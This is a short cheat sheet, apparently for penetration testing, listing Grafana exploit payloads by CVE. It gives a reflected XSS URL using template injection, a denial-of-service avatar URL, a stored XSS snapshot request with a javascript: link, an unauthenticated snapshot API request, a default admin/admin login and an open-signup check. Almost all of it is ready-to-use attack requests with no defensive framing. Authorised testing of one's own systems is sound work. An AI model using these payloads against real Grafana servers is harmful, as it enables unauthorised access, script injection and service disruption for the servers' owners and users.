# Grafana
1. CVE-2021-41174 (Reflected XSS)
```
<GRAFANA URL>/dashboard/snapshot/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D?orgId=1
```
2. CVE-2020-13379 (Denial of Service)
```
<GRAFANA URL>/avatar/%7B%7Bprintf%20%22%25s%22%20%22this.Url%22%7D%7D
```
3. CVE-2020-11110 (Stored XSS)
```
POST /api/snapshots HTTP/1.1
Host: <GRAFANA URL>
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: {{BaseURL}}
content-type: application/json
Connection: close

{"dashboard":{"annotations":{"list":[{"name":"Annotations & Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"gnetId":null,"graphTooltip":0,"id":null,"links":[],"panels":[],"schemaVersion":18,"snapshot":{"originalUrl":"javascript:alert('Revers3c')","timestamp":"2020-03-30T01:24:44.529Z"},"style":"dark","tags":[],"templating":{"list":[]},"time":{"from":null,"to":"2020-03-30T01:24:53.549Z","raw":{"from":"6h","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Dashboard","uid":null,"version":0},"name":"Dashboard","expires":0}
```
4. CVE-2019-15043 (Grafana Unauthenticated API)
```
POST /api/snapshots HTTP/1.1
Host: <GRAFANA URL>
Connection: close
Content-Length: 235
Accept: */*
Accept-Language: en
Content-Type: application/json

{"dashboard":{"editable":false,"hideControls":true,"nav":[{"enable":false,"type":"timepicker"}],"rows": [{}],"style":"dark","tags":[],"templating":{"list":[]},"time":{},"timezone":"browser","title":"Home","version":5},"expires": 3600}
```
5. Default Credentials
```
Try to login using admin as username and password
```
6. Signup Enabled
```
<GRAFANA URL>/signup
```